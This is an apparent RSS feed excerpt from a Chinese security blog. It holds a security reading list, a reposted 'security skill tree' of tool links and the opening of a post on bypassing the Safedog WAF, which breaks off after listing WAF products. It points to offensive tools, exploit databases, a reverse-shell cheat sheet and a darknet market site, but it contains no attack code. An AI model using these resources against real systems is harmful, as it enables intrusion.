<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgdcG1IXASJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQISDlUSWRYdS0IJRmt3BGRXFloyC2dLcVRsPBN4W1sHX1JlDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcHVMWABsFUCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVAhsHXBlYCltXWwg%3D" target="_blank" rel="noopener noreffer">《Web前端黑客技术揭秘》</a></li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgZRHF8RBSJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQITA1IfXxIdS0IJRmtHAWhBL1spfWBSABd9OGlSTmUGYT1TDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcHVMSABoEUStcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVAxYAUR9cCltXWwg%3D" target="_blank" rel="noopener noreffer">《HTTP权威指南》</a></li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgZWGloWASJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQITBFQaWBYdS0IJRmtMCnt%2FI3pbUGJLAAx%2BIXJEYkEQEj5DDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwRcEloUAhoHVCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVAxEGVBhYCltXWwg%3D" target="_blank" rel="noopener noreffer">《黑客攻防技术宝典 Web实战篇》</a></li>
<li><a href="https://u.jd.com/XQQNOf" target="_blank" rel="noopener noreffer">《黑客秘笈 渗透测试实用指南》</a></li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEg9XHFgXCyJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQIaBVIYWRwdS0IJRmttRmFzKRldUWdEVxQdD2hhYmAmS0FDDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwVQGVsRAxUPVytcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVChAAVhlSCltXWwg%3D" target="_blank" rel="noopener noreffer">《Python核心编程》</a></li>
<li><a href="https://u.jd.com/IOPdyM" target="_blank" rel="noopener noreffer">《PHP和MySQL Web开发》</a></li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEgVXGF8UBSJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQIQBVYfWhIdS0IJRmtMe1NuJV8%2FUGFQQx1YX0xkaVwwWztlDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwVQGVgTAxABUCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsVABAEURpcCltXWwg%3D" target="_blank" rel="noopener noreffer">《Head First HTML与CSS》</a></li>
<li><a href="https://union-click.jd.com/jdc?e=0&amp;p=AyIHZR5aEQISA1AYUyUCEw9RG1oXBCJDCkMFSjJLQhBaUAscSkIBR0ROVw1VC0dFFQMaA1UaWRMdS0IJRmtFAmQGJlMuVmIUdSVLPE19SVgqWTplDh43XRhcHAMTBFUTaxUDEwZVGVoRBRc3ZRtaJVB83%2BOtg7CzDtP%2FlI6dlSIPVhxdEwQRAVMrWxEDEwVQGVkUBxUPUCtcJXd0RQhTayUyIg%3D%3D&amp;t=W1dCFBBFC1pXUwkEAEAdQFkJBVsUChYHVBldCltXWwg%3D" target="_blank" rel="noopener noreffer">《JavaScript高级程序设计》</a></li>
<li><a href="http://www.w3school.com.cn/" target="_blank" rel="noopener noreffer">W3C</a></li>
<li><a href="http://www.runoob.com/" target="_blank" rel="noopener noreffer">菜鸟教程runoob</a></li>
<li><a href="http://www.nowamagic.net/academy/" target="_blank" rel="noopener noreffer">现代魔法学院</a></li>
<li><a href="http://www.w3school.com.cn/web/index.asp" target="_blank" rel="noopener noreffer">网站构建初级教程_W3C</a>；</li>
<li><a href="http://www.runoob.com/http/http-tutorial.html" target="_blank" rel="noopener noreffer">HTTP协议基础-runoob</a>；</li>
<li><a href="http://www.phpstudy.net/" target="_blank" rel="noopener noreffer">phpStudy</a> ；</li>
<li><a href="http://www.wampserver.com/" target="_blank" rel="noopener noreffer">WAMP</a>；</li>
<li><a href="http://www.freebuf.com/" target="_blank" rel="noopener noreffer">Freebuf</a>；</li>
<li><a href="https://www.ichunqiu.com/newRelease/darrPath/105" target="_blank" rel="noopener noreffer">Web安全-i春秋</a>；</li>
<li><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener noreffer">DVWA</a>；</li>
<li><a href="http://www.freebuf.com/?s=DVWA" target="_blank" rel="noopener noreffer">DVWA系列教程_Freebuf</a>；</li>
<li><a href="https://src.edu-info.edu.cn/" target="_blank" rel="noopener noreffer">教育行业SRC</a>；</li>
<li><a href="https://sosly.me/index.php/2017/06/02/wangluoanquanfa/" target="_blank" rel="noopener noreffer">自律方能自由，《网络安全法》实施后的白帽子行为参考</a>；</li>
<li><a href="https://bbs.ichunqiu.com/forum-59-1.html" target="_blank" rel="noopener noreffer">网站安全_i春秋社区</a>；</li>
<li><a href="http://www.ciscn.cn/" target="_blank" rel="noopener noreffer">全国大学生信息安全竞赛</a>；</li>
<li><a href="https://2017ncstisc.ichunqiu.com/" target="_blank" rel="noopener noreffer">全国大学生信息安全竞赛创新实践能力线上赛（CTF形式）</a>；</li>
<li><a href="https://www.oschina.net/blog" target="_blank" rel="noopener noreffer">oschina</a>；</li>
<li><a href="https://www.cnblogs.com/" target="_blank" rel="noopener noreffer">博客园</a>；</li>
<li><a href="http://www.jianshu.com/" target="_blank" rel="noopener noreffer">简书</a>；</li>
<li><a href="http://www.anquanquan.info/" target="_blank" rel="noopener noreffer">安全圈info</a>；</li>
<li><a href="https://www.sec-wiki.com/" target="_blank" rel="noopener noreffer">SecWiki</a>；</li>
<li><a href="https://mooc.study.163.com/smartSpec/detail/1001227001.htm?share=1&amp;shareId=9305777" target="_blank" rel="noopener noreffer">《Web安全工程师微专业》</a></li>
<li><a href="https://mooc.study.163.com/smartSpec/detail/1001386007.htm?share=1&amp;shareId=9305777" target="_blank" rel="noopener noreffer">《Web安全工程师微专业》进阶版</a></li>
</ol>]]></description>
</item><item>
    <title>安全技能书简版</title>
    <link>https://www.bysec.cn/20210101/</link>
    <pubDate>Fri, 01 Jan 2021 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20210101/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://evilcos.me/security_skill_tree_basic/index.html" target="_blank" rel="noopener noreffer">https://evilcos.me/security_skill_tree_basic/index.html</a></em></p>
</blockquote>
<p></p>
<h2 id="http">HTTP</h2>
<h3 id="burpsuite">BurpSuite</h3>
<h3 id="httpsportswiggernetburp"><a href="https://portswigger.net/burp/">https://portswigger.net/burp/</a></h3>
<h3 id="很多时候免费版本已经满足需求">很多时候，免费版本已经满足需求</h3>
<h3 id="fiddler">Fiddler</h3>
<h3 id="httpwwwtelerikcomfiddler"><a href="http://www.telerik.com/fiddler">http://www.telerik.com/fiddler</a></h3>
<h3 id="firefox">Firefox</h3>
<h3 id="firebug">Firebug</h3>
<h3 id="noscript">NoScript</h3>
<h3 id="chrome">Chrome</h3>
<h3 id="f12">F12</h3>
<h3 id="whatweb">WhatWeb</h3>
<h3 id="httpsgithubcomurbanadventurerwhatwebhttpsgithubcomurbanadventurerwhatweb"><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener noreffer">https://github.com/urbanadventurer/whatweb</a></h3>
<h3 id="w3af">w3af</h3>
<h3 id="httpsgithubcomandresrianchow3afhttpsgithubcomandresrianchow3af"><a href="https://github.com/andresriancho/w3af" target="_blank" rel="noopener noreffer">https://github.com/andresriancho/w3af</a></h3>
<h3 id="sqlmap">sqlmap</h3>
<h3 id="httpsgithubcomsqlmapprojectsqlmaphttpsgithubcomsqlmapprojectsqlmap"><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener noreffer">https://github.com/sqlmapproject/sqlmap</a></h3>
<h3 id="xssor">XSS&rsquo;OR</h3>
<h3 id="httpxssorio"><a href="http://xssor.io/">http://xssor.io/</a></h3>
<h2 id="各种协议">各种协议</h2>
<h3 id="端口扫描">端口扫描</h3>
<h3 id="nmap">Nmap</h3>
<h3 id="httpsnmaporg"><a href="https://nmap.org/">https://nmap.org/</a></h3>
<h3 id="httpshighoncoffeeblognmap-cheat-sheet"><a href="https://highon.coffee/blog/nmap-cheat-sheet/">https://highon.coffee/blog/nmap-cheat-sheet/</a></h3>
<h3 id="zmap">Zmap</h3>
<h3 id="httpswwwzmapio"><a href="https://www.zmap.io/">https://www.zmap.io/</a></h3>
<h3 id="masscan">masscan</h3>
<h3 id="httpsgithubcomrobertdavidgrahammasscanhttpsgithubcomrobertdavidgrahammasscan"><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener noreffer">https://github.com/robertdavidgraham/masscan</a></h3>
<h3 id="httpsgithubcomoffensive-securitymasscan-web-uihttpsgithubcomoffensive-securitymasscan-web-ui"><a href="https://github.com/offensive-security/masscan-web-ui" target="_blank" rel="noopener noreffer">https://github.com/offensive-security/masscan-web-ui</a></h3>
<h3 id="hydra">Hydra</h3>
<h3 id="httpswwwthcorgthc-hydra"><a href="https://www.thc.org/thc-hydra/">https://www.thc.org/thc-hydra/</a></h3>
<h3 id="metasploit">Metasploit</h3>
<h3 id="httpswwwmetasploitcom"><a href="https://www.metasploit.com/">https://www.metasploit.com/</a></h3>
<h3 id="httpsgithubcomrapid7metasploit-frameworkwikinightly-installershttpsgithubcomrapid7metasploit-frameworkwikinightly-installers"><a href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers" target="_blank" rel="noopener noreffer">https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers</a></h3>
<h3 id="流量">流量</h3>
<p>参见: <a href="https://evilcos.me/security_skill_tree_basic/index.html#6lo9jvad7pckkj1h2e4crmjgft" target="_blank" rel="noopener noreffer">流量</a></p>
<h3 id="wireshark">Wireshark</h3>
<h3 id="httpswwwwiresharkorg"><a href="https://www.wireshark.org/">https://www.wireshark.org/</a></h3>
<h3 id="tshark">TShark</h3>
<h3 id="httpswwwwiresharkorgdocsman-pagestsharkhtml"><a href="https://www.wireshark.org/docs/man-pages/tshark.html">https://www.wireshark.org/docs/man-pages/tshark.html</a></h3>
<h3 id="tcpdump">Tcpdump</h3>
<h3 id="httpwwwtcpdumporg"><a href="http://www.tcpdump.org/">http://www.tcpdump.org/</a></h3>
<h3 id="snort">Snort</h3>
<h3 id="httpswwwsnortorg"><a href="https://www.snort.org/">https://www.snort.org/</a></h3>
<h3 id="bro">Bro</h3>
<h3 id="httpswwwbroorg"><a href="https://www.bro.org/">https://www.bro.org/</a></h3>
<h3 id="moloch">Moloch</h3>
<h3 id="httpmoloch"><a href="http://molo.ch/">http://molo.ch/</a></h3>
<h3 id="suricata">Suricata</h3>
<h3 id="httpssuricata-idsorg"><a href="https://suricata-ids.org/">https://suricata-ids.org/</a></h3>
<h2 id="漏洞测试">漏洞测试</h2>
<h3 id="漏洞环境">漏洞环境</h3>
<h3 id="metasploitable3">Metasploitable3</h3>
<h3 id="httpsgithubcomrapid7metasploitable3httpsgithubcomrapid7metasploitable3"><a href="https://github.com/rapid7/metasploitable3" target="_blank" rel="noopener noreffer">https://github.com/rapid7/metasploitable3</a></h3>
<h3 id="webgoat">WebGoat</h3>
<h3 id="httpsgithubcomwebgoatwebgoathttpsgithubcomwebgoatwebgoat"><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener noreffer">https://github.com/WebGoat/WebGoat</a></h3>
<h3 id="dvwa">DVWA</h3>
<h3 id="httpsgithubcomethicalhack3rdvwahttpsgithubcomethicalhack3rdvwa"><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener noreffer">https://github.com/ethicalhack3r/DVWA</a></h3>
<h3 id="xvwa">XVWA</h3>
<h3 id="httpsgithubcoms4n7h0xvwahttpsgithubcoms4n7h0xvwa"><a href="https://github.com/s4n7h0/xvwa" target="_blank" rel="noopener noreffer">https://github.com/s4n7h0/xvwa</a></h3>
<h3 id="网络空间搜索引擎">网络空间搜索引擎</h3>
<h3 id="google">Google</h3>
<h3 id="zoomeye">ZoomEye</h3>
<h3 id="httpswwwzoomeyeorg"><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></h3>
<h3 id="shodan">Shodan</h3>
<h3 id="httpswwwshodanio"><a href="https://www.shodan.io/">https://www.shodan.io/</a></h3>
<h3 id="censys">Censys</h3>
<h3 id="httpscensysio"><a href="https://censys.io/">https://censys.io/</a></h3>
<h3 id="漏洞库">漏洞库</h3>
<h3 id="exploit-db">Exploit-DB</h3>
<h3 id="httpswwwexploit-dbcom"><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></h3>
<h3 id="httpswwwexploit-dbcomsearchsploit"><a href="https://www.exploit-db.com/searchsploit/">https://www.exploit-db.com/searchsploit/</a></h3>
<h3 id="seebug">Seebug</h3>
<h3 id="httpswwwseebugorg"><a href="https://www.seebug.org/">https://www.seebug.org/</a></h3>
<h3 id="0daytoday">0day.today</h3>
<h3 id="http0daytoday"><a href="http://0day.today/">http://0day.today/</a></h3>
<h2 id="渗透测试">渗透测试</h2>
<h3 id="洛马七步杀">洛马七步杀</h3>
<p>参见:<a href="https://evilcos.me/security_skill_tree_basic/index.html#0l09n3d0vap3b6e877j7qpar0j" target="_blank" rel="noopener noreffer">假设自己正被“洛马七步杀</a></p>
<h3 id="httpwwwlockheedmartincomuswhat-we-doaerospace-defensecybercyber-kill-chainhtml"><a href="http://www.lockheedmartin.com/us/what-we-do/aerospace-defense/cyber/cyber-kill-chain.html">http://www.lockheedmartin.com/us/what-we-do/aerospace-defense/cyber/cyber-kill-chain.html</a></h3>
<h3 id="penetrationtestingtoolscheatsheet">PenetrationTestingToolsCheatSheet</h3>
<h3 id="httpshighoncoffeeblogpenetration-testing-tools-cheat-sheet"><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/</a></h3>
<h3 id="端口转发">端口转发</h3>
<h3 id="最基础的ssh隧道">最基础的SSH隧道</h3>
<h3 id="httpswwwibmcomdeveloperworkscnlinuxl-cn-sshforwardindexhtml"><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html">https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html</a></h3>
<h3 id="iptables-tnat">iptables-tnat</h3>
<h3 id="httpsaccessredhatcomdocumentationen-usred_hat_enterprise_linux4htmlsecurity_guides1-firewall-ipt-fwdhtml"><a href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/4/html/Security_Guide/s1-firewall-ipt-fwd.html">https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/4/html/Security_Guide/s1-firewall-ipt-fwd.html</a></h3>
<h3 id="rtcppy">rtcp.py</h3>
<h3 id="httpsgithubcomknownsecrtcphttpsgithubcomknownsecrtcp"><a href="https://github.com/knownsec/rtcp(https://github.com/knownsec/rtcp)">https://github.com/knownsec/rtcp(https://github.com/knownsec/rtcp)</a></h3>
<h3 id="姿势大全">姿势大全</h3>
<h3 id="httpsartkondcom20170323pivoting-guide"><a href="https://artkond.com/2017/03/23/pivoting-guide/">https://artkond.com/2017/03/23/pivoting-guide/</a></h3>
<h3 id="reverseshellcheatsheet">ReverseShellCheatSheet</h3>
<h3 id="httppentestmonkeynetcheat-sheetshellsreverse-shell-cheat-sheet"><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></h3>
<h3 id="部分框架">部分框架</h3>
<h3 id="kalilinux">KaliLinux</h3>
<h3 id="httptoolskaliorgtools-listing"><a href="http://tools.kali.org/tools-listing">http://tools.kali.org/tools-listing</a></h3>
<h3 id="pentestbox">PentestBox</h3>
<h3 id="httpspentestboxorg"><a href="https://pentestbox.org/">https://pentestbox.org/</a></h3>
<h3 id="maltego">Maltego</h3>
<h3 id="httpswwwpatervacomweb7"><a href="https://www.paterva.com/web7/">https://www.paterva.com/web7/</a></h3>
<h3 id="thesocial-engineertoolkitset">TheSocial-EngineerToolkit(SET)</h3>
<h3 id="httpsgithubcomtrustedsecsocial-engineer-toolkithttpsgithubcomtrustedsecsocial-engineer-toolkit"><a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener noreffer">https://github.com/trustedsec/social-engineer-toolkit</a></h3>
<h3 id="cobaltstrike">CobaltStrike</h3>
<h3 id="httpswwwcobaltstrikecom"><a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com/</a></h3>
<h3 id="nmap-1">Nmap</h3>
<h3 id="metasploit-1">Metasploit</h3>
<h3 id="beef">BeEF</h3>
<h3 id="httpbeefprojectcom"><a href="http://beefproject.com/">http://beefproject.com/</a></h3>
<h3 id="mitmproxy">mitmproxy</h3>
<h3 id="httpsmitmproxyorg"><a href="https://mitmproxy.org/">https://mitmproxy.org/</a></h3>
<h2 id="防御">防御</h2>
<h3 id="暴力美学">暴力美学</h3>
<h3 id="不需要必须放线上的服务都下线">不需要必须放线上的服务都下线</h3>
<h3 id="默认关闭所有端口只开需要的">默认关闭所有端口，只开需要的</h3>
<h3 id="服务器登录只允许公私钥形式">服务器登录只允许公私钥形式</h3>
<h3 id="干掉一切明文传输">干掉一切明文传输</h3>
<h3 id="使用口碑好的第三方服务及组件">使用口碑好的第三方服务及组件</h3>
<h3 id="备份备份再备份">备份备份再备份</h3>
<h3 id="假设自己正被洛马七步杀">假设自己正被“洛马七步杀”</h3>
<p>参见:<a href="https://evilcos.me/security_skill_tree_basic/index.html#6icp32bmlg4q4r4im8ei309oje" target="_blank" rel="noopener noreffer">洛马七步杀</a></p>
<h3 id="部分工具">部分工具</h3>
<h3 id="流量-1">流量</h3>
<p>参见:<a href="https://evilcos.me/security_skill_tree_basic/index.html#4cdpp82tqb1om3ue4gvavsimd9" target="_blank" rel="noopener noreffer">流量</a></p>
<h3 id="securityonion">SecurityOnion</h3>
<h3 id="httpssecurityonionnet"><a href="https://securityonion.net/">https://securityonion.net/</a></h3>
<h3 id="ossec">OSSEC</h3>
<h3 id="httpsossecgithubio"><a href="https://ossec.github.io/">https://ossec.github.io/</a></h3>
<h3 id="splunk">Splunk</h3>
<h3 id="httpswwwsplunkcom"><a href="https://www.splunk.com/">https://www.splunk.com/</a></h3>
<h3 id="elk">ELK</h3>
<h3 id="lynis">Lynis</h3>
<h3 id="httpscisofycomlynis"><a href="https://cisofy.com/lynis/">https://cisofy.com/lynis/</a></h3>
<h3 id="iptables防火墙">iptables/防火墙</h3>
<h3 id="jwt">JWT</h3>
<h3 id="httpsjwtio"><a href="https://jwt.io/">https://jwt.io/</a></h3>
<h3 id="资料">资料</h3>
<h3 id="程序员与黑客系列">程序员与黑客系列</h3>
<h3 id="httpwwwinfoqcomcnpresentationsprogrammers-and-hackers"><a href="http://www.infoq.com/cn/presentations/programmers-and-hackers">http://www.infoq.com/cn/presentations/programmers-and-hackers</a></h3>
<h3 id="httpwwwinfoqcomcnpresentationsprogrammers-and-hackers-part02"><a href="http://www.infoq.com/cn/presentations/programmers-and-hackers-part02">http://www.infoq.com/cn/presentations/programmers-and-hackers-part02</a></h3>
<h3 id="实用性开发人员安全须知">实用性开发人员安全须知</h3>
<h3 id="httpsgithubcomfallibleincsecurity-guide-for-developershttpsgithubcomfallibleincsecurity-guide-for-developers"><a href="https://github.com/FallibleInc/security-guide-for-developers" target="_blank" rel="noopener noreffer">https://github.com/FallibleInc/security-guide-for-developers</a></h3>
<h3 id="saas型初创企业安全101">SaaS型初创企业安全101</h3>
<h3 id="httpsgithubcomfortersecurity-101-for-saas-startupshttpsgithubcomfortersecurity-101-for-saas-startups"><a href="https://github.com/forter/security-101-for-saas-startups" target="_blank" rel="noopener noreffer">https://github.com/forter/security-101-for-saas-startups</a></h3>
<h2 id="从脚本到大并发">从脚本到大并发</h2>
<h3 id="javascript">JavaScript</h3>
<h3 id="jquery">jQuery</h3>
<h3 id="bootstrap">Bootstrap</h3>
<h3 id="前端框架不仅javascript">前端框架，不仅JavaScript</h3>
<h3 id="nodejs">Node.js</h3>
<h3 id="httpsnodejsorg"><a href="https://nodejs.org/">https://nodejs.org/</a></h3>
<h3 id="npm">npm</h3>
<h3 id="httpswwwnpmjscom"><a href="https://www.npmjs.com/">https://www.npmjs.com/</a></h3>
<h3 id="python">Python</h3>
<h3 id="pep8编程习惯">PEP8编程习惯</h3>
<h3 id="httpswwwpythonorgdevpepspep-0008"><a href="https://www.python.org/dev/peps/pep-0008/">https://www.python.org/dev/peps/pep-0008/</a></h3>
<h3 id="urllib2">urllib2</h3>
<h3 id="socket">socket</h3>
<h3 id="requests">requests</h3>
<h3 id="框架">框架</h3>
<h3 id="scrapy">Scrapy</h3>
<h3 id="爬虫框架">爬虫框架</h3>
<h3 id="django">Django</h3>
<h3 id="web开发框架">Web开发框架</h3>
<h3 id="并发">并发</h3>
<h3 id="threadthreading">thread/threading</h3>
<h3 id="multiprocessing">multiprocessing</h3>
<h3 id="gevent">gevent</h3>
<h3 id="pip">pip</h3>
<h3 id="httpspypipythonorgpypi"><a href="https://pypi.python.org/pypi">https://pypi.python.org/pypi</a></h3>
<h3 id="go">Go</h3>
<h3 id="httpstourgo-zhorglist"><a href="https://tour.go-zh.org/list">https://tour.go-zh.org/list</a></h3>
<h2 id="数据相关">数据相关</h2>
<h3 id="bsddb">bsddb</h3>
<h3 id="sqlite">SQLite</h3>
<h3 id="mysql">MySQL</h3>
<h3 id="mongodb">MongoDB</h3>
<h3 id="cassandra">Cassandra</h3>
<h3 id="elk-1">ELK</h3>
<h3 id="elasticsearch">Elasticsearch</h3>
<h3 id="logstash">Logstash</h3>
<h3 id="kibana">Kibana</h3>
<h3 id="neo4j">Neo4j</h3>
<h3 id="redis">Redis</h3>
<h3 id="memcached">Memcached</h3>
<h3 id="hadoop">Hadoop</h3>
<h3 id="json">JSON</h3>
<h3 id="xml">XML</h3>
<h3 id="cpickle">cPickle</h3>
<h3 id="protobuf">protobuf</h3>
<h2 id="正则表达式">正则表达式</h2>
<h3 id="调试工具">调试工具</h3>
<h3 id="kodos">Kodos</h3>
<h3 id="regexbuddy">RegexBuddy</h3>
<h3 id="httpsregexpercom"><a href="https://regexper.com/">https://regexper.com/</a></h3>
<h3 id="正则表达式30分钟入门教程">正则表达式30分钟入门教程</h3>
<h3 id="httpsdeerchaonettutorialsregexregexhtm"><a href="https://deerchao.net/tutorials/regex/regex.htm">https://deerchao.net/tutorials/regex/regex.htm</a></h3>
<h3 id="python-1">Python</h3>
<h3 id="httpwikiubuntuorgcnpython正则表达式操作指南"><a href="http://wiki.ubuntu.org.cn/Python">http://wiki.ubuntu.org.cn/Python</a>正则表达式操作指南</h3>
<h2 id="高效习惯">高效习惯</h2>
<h3 id="vim">VIM</h3>
<h3 id="简明vim练级攻略">简明VIM练级攻略</h3>
<h3 id="httpcoolshellcnarticles5426html"><a href="http://coolshell.cn/articles/5426.html">http://coolshell.cn/articles/5426.html</a></h3>
<h3 id="markdown">Markdown</h3>
<h3 id="git">Git</h3>
<h3 id="httpstrygithubio"><a href="https://try.github.io/">https://try.github.io/</a></h3>
<h3 id="freemindxmind">FreeMind/XMind</h3>
<h3 id="yed">yEd</h3>
<h3 id="evernote">Evernote</h3>
<h3 id="windows">Windows</h3>
<h3 id="putty">Putty</h3>
<h3 id="httpswwwchiarkgreenendorguksgtathamputtylatesthtml"><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a></h3>
<h3 id="winscp">WinSCP</h3>
<h3 id="sysinternalssuite">SysinternalsSuite</h3>
<h3 id="mac">Mac</h3>
<h3 id="iterm2">iTerm2</h3>
<h3 id="httpwwwiterm2com"><a href="http://www.iterm2.com/">http://www.iterm2.com/</a></h3>
<h3 id="homebrew">Homebrew</h3>
<h3 id="httpsbrewsh"><a href="https://brew.sh/">https://brew.sh/</a></h3>
<h3 id="linux">Linux</h3>
<h3 id="bash">Bash</h3>
<h3 id="httpsgithubcomjlevythe-art-of-command-linehttpsgithubcomjlevythe-art-of-command-line"><a href="https://github.com/jlevy/the-art-of-command-line" target="_blank" rel="noopener noreffer">https://github.com/jlevy/the-art-of-command-line</a></h3>
<h3 id="httpsgithubcomidnanbash-guidehttpsgithubcomidnanbash-guide"><a href="https://github.com/Idnan/bash-guide" target="_blank" rel="noopener noreffer">https://github.com/Idnan/bash-guide</a></h3>
<h3 id="tmuxscreengrepzgrepawksedcutfinddudfddlscatcdpwdidfreepsnetstatvmstattopcrontabtreetailheadviifconfiglsofdigmountstringsunameechohistorytarunzipgzipzipdiffmd5sumfilebase64rmmvgcckillchownchmodlastwhoamistraceltraceiptablesnohupncscpsshtelnet">tmux/screen/grep/zgrep/awk/sed/cut/find/du/df/dd/ls/cat/cd/pwd/id/free/ps/netstat/vmstat/top/crontab/tree/tail/head/vi/ifconfig/lsof/dig/mount/strings/uname/echo/history/tar/unzip/gzip/zip/diff/md5sum/file/base64/rm/mv/gcc/kill/chown/chmod/last/whoami/strace/ltrace/iptables/nohup/nc/scp/ssh/telnet</h3>
<h3 id="隔离">隔离</h3>
<h3 id="vmware">VMware</h3>
<h3 id="virtualbox">VirtualBox</h3>
<h3 id="parallelsdesktop">ParallelsDesktop</h3>
<h3 id="docker">Docker</h3>
<h3 id="翻墙">翻墙</h3>
<h3 id="httpsgithubcomshadowsockshttpsgithubcomshadowsocks"><a href="https://github.com/shadowsocks" target="_blank" rel="noopener noreffer">https://github.com/shadowsocks</a></h3>
<h3 id="proxychains">proxychains</h3>
<h3 id="暗网">暗网</h3>
<h3 id="httpsalphabaymarketcom"><a href="https://alphabaymarket.com/">https://alphabaymarket.com/</a></h3>
<h3 id="硬件">硬件</h3>
<h3 id="iphoneipadmac">iPhone+iPad+Mac</h3>
<h3 id="thinkpad">ThinkPad</h3>
<h3 id="云服务">云服务</h3>
<h3 id="vps">VPS</h3>
<h3 id="aws">AWS</h3>
<h3 id="linode">Linode</h3>
<h3 id="vultr">Vultr</h3>
<h3 id="digitalocean">DigitalOcean</h3>
<h3 id="dropbox">Dropbox</h3>
<h3 id="onedrive">OneDrive</h3>
<h3 id="googledocs">GoogleDocs</h3>
<h3 id="email">Email</h3>
<h3 id="gmail">Gmail</h3>
<h3 id="outlook">Outlook</h3>
<h3 id="protonmail">ProtonMail</h3>
<h3 id="安全">安全</h3>
<h3 id="gpg">GPG</h3>
<h3 id="httpsgnupgorgdownloadindexhtml"><a href="https://gnupg.org/download/index.html">https://gnupg.org/download/index.html</a></h3>
<h3 id="truecrypt">TrueCrypt</h3>
<h3 id="情报跟进">情报跟进</h3>
<h3 id="inoreader">Inoreader</h3>
<h3 id="twitter">Twitter</h3>
<h2 id="说明">说明</h2>
<h3 id="v1by余弦201709">V1By@余弦201709</h3>
<h3 id="联系我evilcosgmailcom">联系我：evilcos@gmail.com</h3>
<h3 id="更新动态关注微信公众号懒人在思考">更新动态关注微信公众号：懒人在思考</h3>
<h3 id="工欲善其事必先利其器">工欲善其事必先利其器</h3>
<h3 id="世界之大总有一款利器适合你">世界之大总有一款利器适合你</h3>
<h3 id="httpsgithubcomhack-with-githubawesome-hackinghttpsgithubcomhack-with-githubawesome-hacking"><a href="https://github.com/Hack-with-Github/Awesome-Hacking" target="_blank" rel="noopener noreffer">https://github.com/Hack-with-Github/Awesome-Hacking</a></h3>
<h3 id="特别说明">特别说明</h3>
<h3 id="这份技能树最适合走向安全工程化之路的人">这份技能树最适合走向安全工程化之路的人</h3>
<h3 id="这份技能树以利器为主要出发点进行梳理">这份技能树以利器为主要出发点进行梳理</h3>
<h3 id="应该叫余弦的安全技能树简版更合适">应该叫“余弦的安全技能树简版”更合适</h3>]]></description>
</item><item>
    <title>绕waf系列之绕安全狗</title>
    <link>https://www.bysec.cn/20201201/</link>
    <pubDate>Tue, 01 Dec 2020 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20201201/</guid>
    <description><![CDATA[<h1 id="攻击的特定">攻击的特定:</h1>
<p>攻击二象性:已知攻击和未知攻击</p>
<h1 id="目前市面主流的waf产品">目前市面主流的WAF产品:</h1>
<h2 id="云waf">云WAF</h2>
<ul>
<li>阿里云盾</li>
<li>腾讯网站管家</li>
<li>创宇盾</li>
<li>ClodeFlare等</li>
</ul>
<h2 id="软件产品类">软件产品类</h2>
<ul>
<li>安全狗</li>
<li>云锁</li>
<li>360主机卫士</li>
<li>ModSecurity</li>
</ul>
<h2 id="硬件类型设备">硬件类型设备:</h2>
<ul>
<li>启明星辰</li>
<li>绿盟</li>
<li>天融信</li>
<li>飞塔等</li>
</ul>
